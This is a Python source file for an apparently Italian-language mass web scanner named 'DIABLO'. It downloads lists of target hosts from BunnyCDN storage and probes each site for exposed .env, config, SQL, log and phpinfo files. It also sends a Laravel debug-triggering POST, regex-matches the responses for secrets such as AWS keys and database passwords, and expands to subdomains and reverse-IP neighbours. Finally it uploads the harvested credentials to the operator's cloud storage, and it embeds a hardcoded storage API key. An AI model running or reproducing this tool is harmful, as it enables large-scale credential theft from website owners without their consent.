import os
import sys
import re
import json
import hashlib
import string
import random
import ipaddress
import socket
import time

# Gevent monkey patch DEVE essere il primissimo import prima di requests/grequests
from gevent import monkey
monkey.patch_all()

from urllib.parse import urlparse
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import warnings
import requests
import grequests
import multiprocessing
from itertools import islice

requests.packages.urllib3.disable_warnings()
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

BUNNY_STORAGE_URL = "https://storage.bunnycdn.com/hunters"
BUNNY_API_KEY = "a34bea81-b348-49fb-a28ef869d967-3fe2-43fc"

def download_files_from_bunny():
    """Scarica i file txt dalla cartella site/ nello storage di Bunny"""
    print("Inizio download file da Bunny Storage...", flush=True)
    headers = {"AccessKey": BUNNY_API_KEY, "Accept": "application/json"}
    site_dir = 'site'
    os.makedirs(site_dir, exist_ok=True)
    
    try:
        url = f"{BUNNY_STORAGE_URL}/site/"
        response = requests.get(url, headers=headers)
        print(f"Richiesta lista file a {url} - Status: {response.status_code}", flush=True)
        
        if response.status_code == 200:
            files = response.json()
            print(f"Trovati {len(files)} elementi nella cartella site/ su Bunny.", flush=True)
            for file_info in files:
                if not file_info.get("IsDirectory", True) and file_info.get("ObjectName", "").endswith(".txt"):
                    file_name = file_info["ObjectName"]
                    file_url = f"{BUNNY_STORAGE_URL}/site/{file_name}"
                    res = requests.get(file_url, headers=headers)
                    if res.status_code == 200:
                        with open(os.path.join(site_dir, file_name), "wb") as f:
                            f.write(res.content)
                        print(f"Scaricato con successo: {file_name}", flush=True)
                    else:
                        print(f"Errore download {file_name}: {res.status_code}", flush=True)
        else:
            print(f"Errore Bunny Storage: {response.text}", flush=True)
    except Exception as e:
        print(f"Eccezione durante il download: {str(e)}", flush=True)
        with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
            f.write(f"Error downloading from Bunny Storage: {str(e)}\n")

def upload_file_to_bunny(local_path, remote_path):
    """Carica un file locale nello storage di Bunny"""
    headers = {"AccessKey": BUNNY_API_KEY}
    try:
        with open(local_path, "rb") as f:
            data = f.read()
        url = f"{BUNNY_STORAGE_URL}/{remote_path}"
        res = requests.put(url, headers=headers, data=data)
        if res.status_code in [200, 201]:
            print(f"Caricato su Bunny: {remote_path}", flush=True)
        else:
            print(f"Errore upload {remote_path}: Status {res.status_code} - {res.text}", flush=True)
    except Exception as e:
        print(f"Eccezione durante l'upload di {remote_path}: {str(e)}", flush=True)
        with open(os.path.join('DIABLO-LOGV9', 'ERROR2.txt'), 'a', encoding='utf-8') as f:
            f.write(f"Error uploading to Bunny Storage: {str(e)}\n")

def upload_results_to_bunny():
    """Carica tutta la cartella DIABLO-LOGV9 su Bunny Storage in risultati/"""
    print("Inizio caricamento risultati su Bunny Storage...", flush=True)
    for root, _, files in os.walk(result_dir):
        for file in files:
            local_path = os.path.join(root, file)
            rel_path = os.path.relpath(local_path, result_dir)
            remote_path = f"risultati/{rel_path}".replace("\\", "/")
            upload_file_to_bunny(local_path, remote_path)

def load_config():
    try:
        with open('pack.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

config = load_config()
keyword_regexenv = config.get('APP_REGEX_ENV_SHELL', [])
file_envscan = list(dict.fromkeys(config.get('file_env_shellscan', [])))
file_phpprofile = list(dict.fromkeys(config.get('file_phpprofile_shellscan', [])))

result_dir = 'DIABLO-LOGV9'
newpathtextract = os.path.join(result_dir, 'DIABLO_FILES_SPLIT')
myfile_checktmobileprv = os.path.join(result_dir, 'DIABLO_ENV.txt')
myfile_checktmobilephp = os.path.join(result_dir, 'DIABLO_PHPINFO.txt')
myfile_checktmobilephps = os.path.join(result_dir, 'DIABLO_ENV_NEW.txt')
myfile_checkxml = os.path.join(result_dir, 'DIABLO_XML.txt')

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive"
}

def generate_list_env_from_json_multi(site_link):
    base = site_link.rstrip('/')
    for i in range(0, len(file_envscan), 100):
        yield [f"{base}/{p.lstrip('/')}" for p in file_envscan[i:i + 100]]

def generate_list_phpprofile_from_json_multi(site_link):
    base = site_link.rstrip('/')
    for i in range(0, len(file_phpprofile), 100):
        yield [f"{base}/{p.lstrip('/')}" for p in file_phpprofile[i:i + 100]]

def chunked_hosts_multi(file_found, chunk_size=50):
    seen = set()
    unique = []
    try:
        with open(file_found, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if url and url not in seen:
                    seen.add(url)
                    unique.append(url)
    except:
        return
    it = iter(unique)
    while True:
        chunk = list(islice(it, chunk_size))
        if not chunk:
            break
        yield chunk

def content_diablo_resp(req):
    if sys.version_info[0] < 3:
        try:
            try: return str(req.content)
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.content.decode('utf-8'))
        except: return str(req.text)
    else:
        try:
            try: return str(req.content.decode('utf-8'))
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.text)
        except: return str(req.content)

def clean_subdomain(sub, domain):
    sub = sub.lower().strip()
    if sub.startswith('*.'):
        sub = sub[2:]
    if sub.startswith('www.'):
        sub = sub[4:]
    return sub

def reverse_ip_lookup(ip):
    url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            result = response.text.strip()
            if "No DNS A records found" in result or "API count exceeded" in result or "error" in result.lower():
                return None
            else:
                aweee = []
                domains = result.split('\n')
                for d in domains:
                    if d.startswith("www."):
                        d = d[4:]
                    aweee.append(d)
                return aweee
    except:
        pass
    return None

def find_subdomains(domain):
    subdomains = set()
    try:
        url_ht = f"https://api.hackertarget.com/hostsearch/?q={domain}"
        res_ht = requests.get(url_ht, timeout=10)
        if res_ht.status_code == 200 and "error" not in res_ht.text.lower():
            lines = res_ht.text.strip().split('\n')
            for line in lines:
                sub = line.split(',')[0]
                sub = clean_subdomain(sub, domain)
                if sub.endswith(domain) and sub != domain:
                    subdomains.add(sub)
    except:
        pass

    try:
        url_otx = f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns"
        res_otx = requests.get(url_otx, timeout=10)
        if res_otx.status_code == 200:
            data = res_otx.json()
            for entry in data.get('passive_dns', []):
                sub = entry.get('hostname', '')
                sub = clean_subdomain(sub, domain)
                if sub.endswith(domain) and sub != domain:
                    subdomains.add(sub)
    except:
        pass

    try:
        url_crt = f"https://crt.sh/?q=%.{domain}&output=json"
        res_crt = requests.get(url_crt, timeout=15)
        if res_crt.status_code == 200:
            data = res_crt.json()
            for entry in data:
                name = entry.get('name_value', '')
                clean_names = name.split('\n')
                for cn in clean_names:
                    cn = clean_subdomain(cn, domain)
                    if cn.endswith(domain) and cn != domain:
                        subdomains.add(cn)
    except:
        pass

    if subdomains:
        aweee = []
        for sub in sorted(subdomains):
            if sub.startswith("www."):
                sub = sub[4:]
            aweee.append(sub)
        return aweee
    return None

def process_urls(urls_list, is_fallback=False):
    it = iter(urls_list)
    while True:
        chunk = list(islice(it, 50))
        if not chunk:
            break
        
        try:
            resp_site = [
                grequests.get(f"http://{url}", timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in chunk
            ]
            merdb = grequests.map(resp_site)
            hosts_by_site = {}
            for r in merdb:
                if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()
                
            retry_urls = [chunk[i] for i, r in enumerate(merdb) if r is None or (r.status_code not in [requests.codes.ok, 403, 200, 206])]
            resp_retry = [
                grequests.get(f"https://{url}", timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in retry_urls
            ]
            retry_responses = grequests.map(resp_retry)
            for r in retry_responses:
                if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()
                
            for site_link, site_payloads in hosts_by_site.items():
                _scan_site(site_link, site_payloads, is_fallback)
                
        except Exception as e:
            with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
                f.write(str(e) + '\n')

def _scan_site(site_link, site_payloads, is_fallback=False):
    try:
        found_env_urls = []
        found_php_urls = []
        checked = 0
        checkeds = 0
        wildcard_strike_count = 0
        fake_for_site = False
        found_for_site = False
        headers_scout = dict(headers)
        
        env_batches = site_payloads.get('env', [])
        for batch in env_batches:
            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout) for url in batch]
            merdb = grequests.map(reqss)
            for r in merdb:
                if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                    checked += 1
                    try:
                        content = r.content
                        content_lower = content.lower()
                        if b'<pre' in content_lower and b'</pre>' in content_lower:
                            fake_for_site = True
                            r.close()
                            break
                        if b"popbox.fun" in content_lower:
                            fake_for_site = True
                            r.close()
                            break
                        head = next(r.iter_content(chunk_size=100))
                        if b'<html' not in head.lower() and b'<!doctype' not in head.lower() and b'<body' not in head.lower():
                            found_env_urls.append(r.url)
                        r.close()
                    except: pass
                if r: r.close()
            if checked >= 10 or fake_for_site: return
            
        php_batches = site_payloads.get('php', [])
        for batch in php_batches:
            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout) for url in batch]
            merdb = grequests.map(reqss)
            for r in merdb:
                if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                    checkeds += 1
                    found_php_urls.append(r.url)
                if r: r.close()
            if checkeds >= 10: return
            
        urls_to_analyze = found_env_urls + found_php_urls
        if not urls_to_analyze: return
        
        seen_content_hashes = set()
        headers_file_probe = dict(headers)
        headers_file_probe['Range'] = 'bytes=0-4096'
        
        findfile_requests = []
        for url in urls_to_analyze:
            url_lower_check = url.lower()
            is_static = any(x in url_lower_check for x in ['.env', '.js', '.json', '.txt', '.yml', '.yaml', '.ini', '.xml', '.log', '.zip', '.bak', '.sql', '.conf', 'config', '.local', '.remote', '.production', '.old', '.save', 'credentials', 'cache', 'laravel', 'public', 'pusher'])
            if is_static:
                req = grequests.get(url, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe)
            else:
                req = grequests.post(url, data={"0x01[]":"legion"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe)
            findfile_requests.append(req)
            
        responsesf = grequests.map(findfile_requests)
        unique_responses = {}
        for r in responsesf:
            if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                if r.url not in unique_responses:
                    try:
                        content = r.content
                        url_lower = r.url.lower()
                        content_len = len(content)
                        if content_len < 10 or content_len > 1000000:
                            r.close()
                            continue
                        is_html_doc = b'<html' in content[:200].lower() or b'<!doctype' in content[:200].lower()
                        is_debug_page = False
                        if is_html_doc:
                            content_str_head = content[:5000].decode('utf-8', errors='ignore').lower()
                            debug_keywords = ['phpinfo()', 'php version', 'zend extension', 'php license', 'sf-toolbar', 'symfony profiler', 'php-debugbar', 'whoops! there was an error', 'stack trace', 'aws_access_key_id', 'db_password', 'db_host', 'aws_secret']
                            if any(k in content_str_head for k in debug_keywords):
                                is_debug_page = True
                        if is_html_doc and not is_debug_page:
                            r.close()
                            continue
                        
                        if b'.env' in url_lower.encode() or any(x in url_lower for x in ['.local', '.remote', '.production', 'config', 'credentials']):
                            if b'=' not in content and b':' not in content:
                                r.close()
                                continue
                        elif url_lower.endswith('.json'):
                            stripped = content.strip()
                            if not (stripped.startswith(b'{') or stripped.startswith(b'[')):
                                r.close()
                                continue
                        elif url_lower.endswith('.xml'):
                            if b'<?xml' not in content[:50] and b'<' not in content[:10]:
                                r.close()
                                continue
                        elif any(url_lower.endswith(x) for x in ['.yml', '.yaml', '.ini', '.conf']):
                            if b'=' not in content and b':' not in content:
                                r.close()
                                continue
                        elif url_lower.endswith('.sql'):
                            content_upper = content[:1000].upper()
                            sql_keys = [b'INSERT INTO', b'CREATE TABLE', b'VALUES', b'SELECT', b'DROP TABLE', b'--']
                            if not any(k in content_upper for k in sql_keys):
                                r.close()
                                continue
                        elif url_lower.endswith('.js'):
                            js_secrets = [b'api_key', b'apikey', b'secret', b'token', b'password', b'credential', b'auth', b'bearer', b'db_']
                            if not any(k in content.lower() for k in js_secrets):
                                r.close()
                                continue
                        elif url_lower.endswith('.log'):
                            log_keys = [b'[202', b'[error]', b'[info]', b'[debug]', b'[warning]']
                            if not any(k in content.lower() for k in log_keys):
                                r.close()
                                continue
                                
                        content_hash = hashlib.md5(content).hexdigest()
                        if content_hash in seen_content_hashes:
                            wildcard_strike_count += 1
                            r.close()
                            if wildcard_strike_count >= 5:
                                fake_for_site = True
                                break
                            continue
                        seen_content_hashes.add(content_hash)
                        unique_responses[r.url] = r
                    except:
                        r.close()
                else: r.close()
            else:
                if r: r.close()
                
        if fake_for_site: return
        
        valid_responzzz = list(unique_responses.values())
        if valid_responzzz:
            for r in valid_responzzz:
                if r is None: continue
                try:
                    contentsx = content_diablo_resp(r)
                except:
                    r.close()
                    continue
                response_url = r.url
                
                url_lower = response_url.lower()
                is_env_file = any(x in url_lower for x in ['.env', '.ini', '.conf', 'config', '.txt', '.local', '.remote', '.production', '.yml', '.yaml', '.bak', '.old', '.save', 'credentials', 'cache', 'laravel', 'public', 'pusher'])
                is_json_file = url_lower.endswith('.json')
                is_php_file = any(x in url_lower for x in ['.php', 'phpinfo', 'view', '_profiler', 'info', '.cgi', '.sh', '.py', '.rb'])
                is_html_content = "<html>" in contentsx.lower() or "<!doctype" in contentsx.lower()
                
                json_content_dict = None
                if is_json_file:
                    try:
                        json_content_dict = json.loads(contentsx)
                        with open(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'a', encoding='utf-8') as f:
                            f.write(f'{json_content_dict}\n')
                    except: pass
                    
                regex_found = False
                for pattern in keyword_regexenv:
                    if "PHP Version" in pattern and not (is_php_file or is_html_content): continue
                    if "PHP Version" in pattern and is_env_file: continue
                    is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
                    if is_regex: regex_pattern = pattern
                    else:
                        escaped = re.escape(pattern)
                        start_b = r"\b" if pattern[0].isalnum() or pattern[0] == '_' else ""
                        end_b = r"\b" if pattern[-1].isalnum() or pattern[-1] == '_' else ""
                        regex_pattern = f"{start_b}{escaped}{end_b}"
                    
                    for match in re.finditer(regex_pattern, contentsx, re.IGNORECASE):
                        found_for_site = True
                        regex_found = True
                        break
                    if regex_found: break
                    
                if regex_found:
                    if not is_html_content:
                        rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                        if is_json_file:
                            with open(os.path.join(result_dir, 'DIABLO_JSON.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link}  1\n')
                            with open(os.path.join(newpathtextract, f'DIABLO_JSON_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                        elif is_env_file:
                            with open(myfile_checktmobilephps, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link}  2\n')
                            with open(os.path.join(newpathtextract, f'DIABLO_ENV_NEW_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                        elif url_lower.endswith('.js'):
                            with open(os.path.join(result_dir, 'DIABLO_JS.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 3\n')
                            with open(os.path.join(newpathtextract, f'DIABLO_JS_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                        elif url_lower.endswith('.xml'):
                            with open(myfile_checkxml, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 4\n')
                            with open(os.path.join(newpathtextract, f'DIABLO_XML_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                        elif url_lower.endswith('.log'):
                            with open(os.path.join(result_dir, 'DIABLO_LOG.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 5\n')
                            with open(os.path.join(newpathtextract, f'DIABLO_LOG_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                        elif url_lower.endswith('.sql'):
                            with open(os.path.join(result_dir, 'DIABLO_SQL.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 6\n')
                            with open(os.path.join(newpathtextract, f'DIABLO_SQL_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                        else:
                            with open(os.path.join(result_dir, 'DIABLO_OTHER.txt'), 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 7\n')
                            with open(os.path.join(newpathtextract, f'DIABLO_OTHER_{rnd_suffix}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                            
                    try:
                        html_content = r.text
                        soup = BeautifulSoup(html_content, "html.parser")
                        h2_tag = soup.find("h2", string="PHP Variables")
                        if h2_tag:
                            table = h2_tag.find_next("table")
                            if table:
                                rows = table.find_all("tr")
                                formatted_output = ""
                                for row in rows:
                                    cols = row.find_all("td")
                                    if len(cols) >= 2:
                                        var_name = cols[0].get_text(strip=True)
                                        var_value = cols[1].get_text(strip=True)
                                        match = re.search(r"\['([^']+)'\]", var_name)
                                        if match:
                                            clean_key = match.group(1)
                                            formatted_output += f"{clean_key} \t {var_value}\n"
                                if formatted_output:
                                    rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                                    with open(myfile_checktmobilephp, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
                                    with open(myfile_checktmobileprv, 'a', encoding='utf-8') as f: f.write(f'{site_link} 8\n')
                                    with open(os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix_php}.txt'), 'w', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
                    except: pass
                try: r.close()
                except: pass
                
                if fake_for_site or found_for_site: break
                
        if found_for_site and not is_fallback:
            hostxxx = urlparse(site_link).hostname
            if hostxxx and hostxxx.startswith("www."):
                hostxxx = hostxxx[4:]
            
            is_ip_addr = False
            try:
                ipaddress.ip_address(hostxxx)
                is_ip_addr = True
            except:
                pass
            
            if not is_ip_addr and hostxxx:
                parts = hostxxx.split(".")
                if len(parts) > 2:
                    target = ".".join(parts[-2:])
                else:
                    target = hostxxx
                
                cazzuno = find_subdomains(target)
                if cazzuno:
                    process_urls(cazzuno, is_fallback=True)
                else:
                    cazzuno = reverse_ip_lookup(hostxxx)
                    if cazzuno:
                        process_urls(cazzuno, is_fallback=True)
            elif hostxxx:
                cazzuno = reverse_ip_lookup(hostxxx)
                if cazzuno:
                    process_urls(cazzuno, is_fallback=True)
                
    except Exception as e:
        with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')

def process_file(file_path):
    for cameras in chunked_hosts_multi(file_path, chunk_size=50):
        try:
            resp_site = [
                grequests.get(f"http://{url}", timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in cameras
            ]
            merdb = grequests.map(resp_site)
            hosts_by_site = {}
            for r in merdb:
                if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()
                
            retry_urls = [cameras[i] for i, r in enumerate(merdb) if r is None or (r.status_code not in [requests.codes.ok, 403, 200, 206])]
            resp_retry = [
                grequests.get(f"https://{url}", timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in retry_urls
            ]
            retry_responses = grequests.map(resp_retry)
            for r in retry_responses:
                if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()
                
            for site_link, site_payloads in hosts_by_site.items():
                _scan_site(site_link, site_payloads)
                
        except Exception as e:
            with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
                f.write(str(e) + '\n')

def main():
    os.makedirs(result_dir, exist_ok=True)
    os.makedirs(newpathtextract, exist_ok=True)
    
    # 1. Scarica i file da Bunny Storage prima di iniziare
    download_files_from_bunny()
    
    site_dir = 'site'
    if not os.path.exists(site_dir):
        os.makedirs(site_dir, exist_ok=True)
        
    txt_files = [os.path.join(site_dir, f) for f in os.listdir(site_dir) if f.endswith('.txt')]
    
    if not txt_files:
        return
        
    # 2. Esegui la scansione
    if txt_files:
        print(f"Avvio scansione su {len(txt_files)} file txt trovati...", flush=True)
        pool = multiprocessing.Pool(processes=5)
        pool.map(process_file, txt_files)
        pool.close()
        pool.join()
        
        # 3. Carica i risultati su Bunny Storage alla fine
        upload_results_to_bunny()
        print("Scansione terminata e risultati caricati.", flush=True)
    else:
        print("Nessun file txt trovato da scansionare.", flush=True)
        
    # 4. LOOP INFINITO: Essenziale per mantenere in vita il container su Bunny
    print("Container in standby (Idle) per evitare il riavvio automatico...", flush=True)
    while True:
        time.sleep(3600)  # Dorme per un'ora e ripete, tenendo il container "Ready"

if __name__ == '__main__':
    multiprocessing.freeze_support()
    main()
